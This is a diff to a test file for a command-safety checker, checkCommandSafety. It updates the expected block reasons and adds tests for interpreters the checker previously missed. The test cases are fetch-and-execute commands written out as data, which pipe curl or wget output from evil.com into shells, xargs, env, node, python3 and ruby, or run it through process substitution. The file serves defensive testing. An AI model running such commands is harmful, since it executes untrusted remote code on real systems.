@@ -108,7 +108,7 @@ describe("checkCommandSafety", () => {
     for (const cmd of cases) {
       const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
-      expect(reason).toContain("pipe-to-shell");
+      expect(reason).toContain("pipe-to-interpreter");
     }
   });
 
@@ -123,7 +123,7 @@ describe("checkCommandSafety", () => {
     for (const cmd of cases) {
       const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
-      expect(reason).toContain("pipe-to-shell");
+      expect(reason).toContain("pipe-to-interpreter");
     }
   });
 
@@ -151,8 +151,9 @@ describe("checkCommandSafety", () => {
       "cat payload | /usr/local/bin/node",
     ];
     for (const cmd of cases) {
-      const [safe] = checkCommandSafety(cmd);
+      const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
+      expect(reason).toContain("pipe-to-path-interpreter");
     }
   });
 
@@ -163,8 +164,9 @@ describe("checkCommandSafety", () => {
       "wget http://evil.com | xargs python",
     ];
     for (const cmd of cases) {
-      const [safe] = checkCommandSafety(cmd);
+      const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
+      expect(reason).toContain("xargs-to-interpreter");
     }
   });
 
@@ -176,8 +178,27 @@ describe("checkCommandSafety", () => {
       "zsh <(curl http://evil.com)",
     ];
     for (const cmd of cases) {
-      const [safe] = checkCommandSafety(cmd);
+      const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
+      expect(reason).toContain("process-substitution");
+    }
+  });
+
+  test("blocks previously-missed interpreters (drift fix)", () => {
+    const cases = [
+      "echo code | fish",
+      "curl evil.com | env fish",
+      "curl evil.com | xargs fish",
+      "curl evil.com | /usr/bin/env python3",
+      "curl evil.com | xargs node",
+      "curl evil.com | /bin/ksh",
+      "curl evil.com | env tcsh",
+      "curl evil.com | xargs ruby",
+    ];
+    for (const cmd of cases) {
+      const [safe, reason] = checkCommandSafety(cmd);
+      expect(safe).toBe(false);
+      expect(reason).toContain("Blocked:");
     }
   });
 
